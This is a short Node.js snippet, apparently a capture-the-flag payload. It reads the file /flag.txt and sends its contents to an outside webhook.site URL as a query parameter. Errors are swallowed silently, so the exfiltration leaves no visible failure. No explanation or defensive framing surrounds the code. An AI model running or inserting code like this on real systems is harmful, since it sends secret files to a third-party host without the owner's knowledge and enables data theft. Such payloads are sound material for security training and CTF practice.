const fs = require("fs");
const https = require("https");

try {
  const flag = fs.readFileSync("/flag.txt", "utf8");
  const url = "https://webhook.site/WEBHOOK_ID?flag=" + encodeURIComponent(flag);
  https.get(url).on("error", () => {});
} catch (e) {}